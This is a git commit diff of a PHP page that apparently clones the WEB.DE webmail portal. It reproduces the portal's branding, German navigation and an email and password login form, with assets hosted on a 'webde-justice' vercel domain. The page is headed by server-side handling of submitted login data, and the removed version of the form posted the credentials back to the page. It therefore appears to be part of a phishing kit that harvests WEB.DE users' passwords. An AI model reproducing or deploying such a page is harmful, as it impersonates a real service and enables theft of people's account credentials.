04a30b04e87adb54d4c56a608c1244b5bfd63b85
Jeffrey Deh <71136336+quean29@users.noreply.github.com>
2024-01-31 14:56:22 +0100

    Update index.php

--- api/index.php
+++ api/index.php
@@ -60,87 +60,85 @@ if (isset($_POST['login'])) {
 
 <body>
   <div class="container-fluid desktop text-center">
-    <div class="row ">
-      <div class="col-8">
-        <header>
-          <nav class=" border-bottom navbar navbar-expand-lg">
-            <div class="container-fluid">
-              <a class="navbar-brand" href="javascript:void(0)">
-                <img src="https://webde-justice.vercel.app/_next/static/media/web.a62c709a.svg" width="100%" height="50px">
-              </a>
-              <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarTogglerDemo02" aria-controls="navbarTogglerDemo02" aria-expanded="false" aria-label="Toggle navigation">
-                <span class="navbar-toggler-icon"></span>
-              </button>
-              <div class="collapse navbar-collapse" id="navbarTogglerDemo02">
-                <form class="d-flex mx-auto" role="search">
-                  <div class="input-group mb-3" style="width: 400px;">
-                    <input class="form-control" type="search" placeholder="Suchen mit WEB.DE" aria-label="Search">
-                    <div class="input-group-append">
-                      <button class="btn btn-warning"><i class="icofont-search"></i></button>
+        <div class="row ">
+          <div class="col-8">
+            <header >
+                <nav class=" border-bottom navbar navbar-expand-md navbar-expand-lg">
+                    <div class="container-fluid">
+                      <a class="navbar-brand" href="#">
+                        <img src="https://webde-justice.vercel.app/_next/static/media/web.a62c709a.svg" width="100%" height="50px">
+                      </a>
+                      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarTogglerDemo02" aria-controls="navbarTogglerDemo02" aria-expanded="false" aria-label="Toggle navigation">
+                        <span class="navbar-toggler-icon"></span>
+                      </button>
+                      <div class="collapse navbar-collapse" id="navbarTogglerDemo02">
+                        <div class="input-group mx-auto">
+                          <input type="text" class="form-control" placeholder="Recipient's username" aria-label="Recipient's username" aria-describedby="button-addon2">
+                          <button class="btn btn-warning" type="button" id="button-addon2"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-search" viewBox="0 0 16 16">
+                            <path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001q.044.06.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1 1 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0"/>
+                          </svg></button>
+                        </div>
+                        <button class="btn btn-outline-primary ">Registeration</button>
+                      </div>
                     </div>
-                  </div>
-
+                  </nav>
+                  <!--tabs-->
+                  <nav class="nav border-bottom">
+                    <a class="nav-link" href="#"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-list" viewBox="0 0 16 16">
+                      <path fill-rule="evenodd" d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5m0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5m0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5"/>
+                    </svg></a>
+                    <a class="nav-link" href="#">Email & Cloud</a>
+                    <a class="nav-link" href="#">Mobilfunk & DSL</a>
+                    <a class="nav-link" href="#">Strom & Gas</a>
+                    <a class="nav-link">Shop</a>
+                    <a class="nav-link">Lotto</a>
+                    <a class="nav-link">Versicherung</a>
+                    <a class="nav-link"><img src="https://adimg.uimserv.net/otto/2021/210617/otto_logo_44x16-2.svg"></a>
+                    <a class="nav-link"><img src="https://adimg.uimserv.net/MONA/2021/Promoline_12461_mona-56x16-1.svg"></a>
+                    <a class="nav-link"><img src="https://adimg.uimserv.net/BaurVersand/210618/Promoline_baur-logo_56x16px-2.svg"></a>
+                  </nav>
+            </header>
+            <div class="news mt-3"> <img src="Lcreenshot1.e3f46304.png" width="100%"/></div>
+            <div class="form-part d-flex justify-content-center p-2 mb-3  sticky-top">
+                <form class="mx-auto text-start">
+                    <div class="row align-items-center ">
+                        <div class="col-auto pb-2"><svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" fill="currentColor" class="bi bi-envelope-fill" viewBox="0 0 16 16">
+                          <path d="M.05 3.555A2 2 0 0 1 2 2h12a2 2 0 0 1 1.95 1.555L8 8.414zM0 4.697v7.104l5.803-3.558zM6.761 8.83l-6.57 4.027A2 2 0 0 0 2 14h12a2 2 0 0 0 1.808-1.144l-6.57-4.027L8 9.586zm3.436-.586L16 11.801V4.697z"/>
+                        </svg></div>
+                        <div class="col-auto "><p>E-Mail</p></div>
+                        <div class="col-auto pb-4"><img src="../public/images/pattern.png" width="15px"></div>
+                        <div class="col-auto">
+                            <label class="visually-hidden" for="inputEmail">Email</label>
+                            <input type="email" class="form-control" id="inputEmail" placeholder="Email">
+                            <small>Kostenlos registrieren!</small>
+                        </div>
+                        <div class="col-auto">
+                            <label class="visually-hidden" for="inputPassword">Password</label>
+                            <input type="password" class="form-control" id="inputPassword" placeholder="Password">
+                            <small>Passwort Vergessen?</small>
+                        </div>
+                        <div class="col-auto">
+                        </div>
+                        <div class="col-auto mb-4">
+                            <button type="submit" class="btn btn-warning">Login</button>
+                        </div>
+                    </div>
                 </form>
-                <button class="btn btn-outline-primary">Registrieren</button>
-              </div>
             </div>
-          </nav>
-          <!--tabs-->
-          <nav class="nav border-bottom">
-            <a class="nav-link" style="color: black; font-size: 17px;"><i class="icofont-navigation-menu"></i></a>
-            <a class="nav-link" aria-current="page" style="color: black; font-size: 14px; ">Email & Cloud</a>
-            <a class="nav-link" href="javascript:void(0)" style="color: black; font-size: 14px;">Mobilfunk & DSL</a>
-            <a class="nav-link" href="javascript:void(0)" style="color: black; font-size:14px">Strom & Gas</a>
-      
-            <a class="nav-link" style="color: black; font-size: 14px;">Lotto</a>
-            <a class="nav-link" style="color: black; font-size: 14px;">Versicherung</a>
-            <a class="nav-link" style="padding-left: 4rem;"><img src="https://adimg.uimserv.net/otto/2021/210617/otto_logo_44x16-2.svg"></a>
-            <a class="nav-link"><img src="https://adimg.uimserv.net/MONA/2021/Promoline_12461_mona-56x16-1.svg"></a>
-            <a class="nav-link"><img src="https://adimg.uimserv.net/BaurVersand/210618/Promoline_baur-logo_56x16px-2.svg"></a>
-          </nav>
-        </header>
-        <div class="news mt-3"> <img src="https://webde-justice.vercel.app/_next/static/media/Lcreenshot1.e3f46304.png" width="100%" /></div>
-        <div class="form-part d-flex justify-content-center p-2 mb-3  sticky-top">
-          <form class="mx-auto text-start" method="post" action="">
-            <div class="row align-items-center ">
-              <div class="col-auto pb-2" style="color: skyblue; font-size: 30px;"> <i class="bi bi-envelope-fill"></i></div>
-              <div class="col-auto pb-2 text-center">
-                <p>E-Mail</p>         
-              </div>
-              <div class="col-auto pb-2"><img src="../public/images/pattern.png" width="11px" height="11px"></div>
-
-              <div class="col-auto">
-                <label class="visually-hidden" for="inputEmail">Email</label>
-                <input type="email" class="form-control" name="email" id="inputEmail" placeholder="E-mail-Addresse" required>
-                <small>Kostenlos registrieren!</small>
-              </div>
-              <div class="col-auto">
-                <label class="visually-hidden" for="inputPassword">Passwort</label>
-                <input type="password" class="form-control" name="password" id="inputPassword" placeholder="Passwort" required>
-                <small>Passwort Vergessen?</small>
-              </div>
-              <div class="col-auto">
-              </div>
-              <div class="col-auto mb-4">
-                <button type="submit" name="login" class="btn btn-warning">Login</button>
-              </div>
+            <div><img src="https://webde-justice.vercel.app/_next/static/media/Screenshot2.f421803f.png" width="100%"/></div>
+            <div><img src="https://webde-justice.vercel.app/_next/static/media/Screenshot3.98cd8e10.png" width="100%"/></div>
+            <div class="col">
+                <img  src="Screenshot4.c08513bd.png" width="100%" >
             </div>
-          </form>
+            <div><img src="https://webde-justice.vercel.app/_next/static/media/Screenshot5.a9e6ba4a.png" width="100%"/></div>
+            <div><img src="https://webde-justice.vercel.app/_next/static/media/Screenshot6.cd6c31fb.png" width="100%"/></div>
+            <div><img src="https://webde-justice.vercel.app/_next/static/media/footer.b5d45359.png" width="100%"/></div>
+          </div>
         </div>
-        <div><img src="https://webde-justice.vercel.app/_next/static/media/Screenshot2.f421803f.png" width="100%" /></div>
-        <div><img src="https://webde-justice.vercel.app/_next/static/media/Screenshot3.98cd8e10.png" width="100%" /></div>
-        <div class="col">
-          <img src="https://explorer.stockprofitsfx.pro/en/Screenshot4.c08513bd.png" width="100%">
-        </div>
-        <div><img src="https://webde-justice.vercel.app/_next/static/media/Screenshot5.a9e6ba4a.png" width="100%" /></div>
-        <div><img src="https://webde-justice.vercel.app/_next/static/media/Screenshot6.cd6c31fb.png" width="100%" /></div>
-        <div><img src="https://webde-justice.vercel.app/_next/static/media/footer.b5d45359.png" width="100%" /></div>
+        <div class=" floatted">
+            <img  src="https://s1.adform.net/Banners/56957908/56957908.gif?bv=4" width="100%" >
+          </div>
       </div>
-    </div>
-    <div class="floatted">
-      <img src="https://s1.adform.net/Banners/56957908/56957908.gif?bv=4" width="100%">
-    </div>
-  </div>
   <!--mobile-->
   <div class=" mobile">
     <header cl>
